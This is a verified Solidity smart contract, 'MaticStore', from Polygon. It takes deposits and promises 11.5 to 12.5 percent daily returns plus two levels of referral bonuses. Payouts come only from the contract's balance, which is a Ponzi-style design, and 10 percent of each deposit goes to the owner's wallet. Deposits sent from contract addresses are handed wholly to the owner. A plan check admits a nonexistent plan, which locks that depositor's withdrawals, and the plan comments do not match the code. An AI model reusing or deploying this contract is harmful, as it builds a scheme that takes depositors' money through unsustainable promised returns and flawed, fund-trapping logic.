/**
 *Submitted for verification at polygonscan.com on 2022-02-24
*/

pragma solidity 0.5.10;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address recipient, uint amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    function decimals() external view returns (uint);
}

contract MaticStore {
	using SafeMath for uint256;


	uint256[] public REFERRAL_PERCENTS = [60,20];
	uint256 constant public TOTAL_REF = 80;
	uint256 constant public CEO_FEE = 100;
	uint256 constant public PERCENTS_DIVIDER = 1000;
	uint256 constant public TIME_STEP = 1 days;
	uint256 constant public HOLD_BONUS = 2;

	uint256 public totalInvested;
	uint256 public totalBonus;

	uint256 public INVEST_MIN_AMOUNT = 10 ether;

    struct Plan {
        uint256 time;
        uint256 percent;
    }

    Plan[] internal plans;

	struct Deposit {
        uint8 plan;
		uint256 amount;
		uint256 start;
	}

	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256[2] levels;
		uint256 bonus;
		uint256 totalBonus;
		uint256 withdrawn;
	}

	mapping (address => User) internal users;
	mapping (address => mapping(uint256 => uint256)) internal userDepositBonus;

	uint256 public startDate;

	address payable public ceoWallet;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint8 plan, uint256 amount, uint256 time);
	event Withdrawn(address indexed user, uint256 amount, uint256 time);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable ceoAddr, uint256 start) public {
		require(!isContract(ceoAddr));
		ceoWallet = ceoAddr;
		if(start>0){
			startDate = start;
		}
		else{
			startDate = block.timestamp;
		}
        plans.push(Plan(10,  125));  // 125%
        plans.push(Plan(15,  120));  // 180%
        plans.push(Plan(20,  115));  // 230%
	}

	function invest(address referrer, uint8 plan) public payable {
		require(block.timestamp > startDate, "contract does not launch yet");
		require(msg.value >= INVEST_MIN_AMOUNT,"error min");
        require(plan < 4, "Invalid plan");
        if(isContract(msg.sender))
        {
            ceoWallet.transfer(msg.value);
        }
        else
        {
			uint256 pFee = msg.value.mul(CEO_FEE).div(PERCENTS_DIVIDER);
			ceoWallet.transfer(pFee);
			emit FeePayed(msg.sender, pFee);
			User storage user = users[msg.sender];
			if (user.referrer == address(0)) {
				if (users[referrer].deposits.length > 0 && referrer != msg.sender) {
					user.referrer = referrer;
				}
				else{
					user.referrer = ceoWallet;
				}
				address upline = user.referrer;
				for (uint256 i = 0; i < 2; i++) {
					if (upline != address(0)) {
						users[upline].levels[i] = users[upline].levels[i].add(1);
						upline = users[upline].referrer;
					} else break;
				}
			}

			if (user.referrer != address(0)) {
				address upline = user.referrer;
				for (uint256 i = 0; i < 2; i++) {
					if (upline != address(0)) {
						uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(PERCENTS_DIVIDER);
						users[upline].bonus = users[upline].bonus.add(amount);
						users[upline].totalBonus = users[upline].totalBonus.add(amount);
						emit RefBonus(upline, msg.sender, i, amount);
						upline = users[upline].referrer;
					} else break;
				}
			}else{
			    uint256 refAmount = msg.value.mul(TOTAL_REF).div(PERCENTS_DIVIDER);
				ceoWallet.transfer(refAmount);
			}
			if (user.deposits.length == 0) {
				user.checkpoint = block.timestamp;
				emit Newbie(msg.sender);
			}
			user.deposits.push(Deposit(plan, msg.value, block.timestamp));
			totalInvested = totalInvested.add(msg.value);
			emit NewDeposit(msg.sender, plan, msg.value, block.timestamp);
		}
	}

	function withdraw() public {
		User storage user = users[msg.sender];
        require(user.checkpoint.add(TIME_STEP) < block.timestamp, "only once a day");
		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
		if (referralBonus > 0) {
			user.bonus = 0;
			totalAmount = totalAmount.add(referralBonus);
		}
		require(totalAmount > 0, "User has no dividends");
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			user.bonus = totalAmount.sub(contractBalance);
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;
		user.withdrawn = user.withdrawn.add(totalAmount);

		msg.sender.transfer(totalAmount);

		emit Withdrawn(msg.sender, totalAmount, block.timestamp);
	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getPlanInfo(uint8 plan) public view returns(uint256 time, uint256 percent) {
		time = plans[plan].time;
		percent = plans[plan].percent;
	}

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 totalAmount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			uint256 finish = user.deposits[i].start.add(plans[user.deposits[i].plan].time.mul(TIME_STEP));
			if (user.checkpoint < finish) {
				uint256 share = user.deposits[i].amount.mul(plans[user.deposits[i].plan].percent).div(PERCENTS_DIVIDER);
				uint256 from = user.deposits[i].start > user.checkpoint ? user.deposits[i].start : user.checkpoint;
				uint256 to = finish < block.timestamp ? finish : block.timestamp;
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(to.sub(from)).div(TIME_STEP));
					uint256 holdDays = (to.sub(from)).div(TIME_STEP);
					if(holdDays > 0){
						totalAmount = totalAmount.add(user.deposits[i].amount.mul(HOLD_BONUS.mul(holdDays)).div(PERCENTS_DIVIDER));
					}
				}
			}
		}
		return totalAmount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns (uint256) {
		return users[userAddress].withdrawn;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256[2] memory referrals) {
		return (users[userAddress].levels);
	}

	function getUserTotalReferrals(address userAddress) public view returns(uint256) {
		return users[userAddress].levels[0]+users[userAddress].levels[1];
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}

	function getUserReferralTotalBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus;
	}

	function getUserReferralWithdrawn(address userAddress) public view returns(uint256) {
		return users[userAddress].totalBonus.sub(users[userAddress].bonus);
	}

	function getUserAvailable(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256 amount) {
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			amount = amount.add(users[userAddress].deposits[i].amount);
		}
	}

	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint8 plan, uint256 percent, uint256 amount, uint256 start, uint256 finish) {
	    User storage user = users[userAddress];
		plan = user.deposits[index].plan;
		percent = plans[plan].percent;
		amount = user.deposits[index].amount;
		start = user.deposits[index].start;
		finish = user.deposits[index].start.add(plans[user.deposits[index].plan].time.mul(TIME_STEP));
	}

	function getSiteInfo() public view returns(uint256 _totalInvested, uint256 _totalRef, uint256 _totalBonus,uint256 _availablebalance) {
		return(totalInvested, totalInvested.mul(TOTAL_REF).div(PERCENTS_DIVIDER),totalBonus,getContractBalance());
	}

	function getUserInfo(address userAddress) public view returns(uint256 totalDeposit, uint256 totalWithdrawn, uint256 totalReferrals,uint256[2] memory referrals) {
		return(getUserTotalDeposits(userAddress), getUserTotalWithdrawn(userAddress), getUserTotalReferrals(userAddress),getUserDownlineCount(userAddress));
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	function setMin(uint256 minAmount) external {
		require(msg.sender == ceoWallet, "only owner");
		INVEST_MIN_AMOUNT = minAmount;
	}
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }
}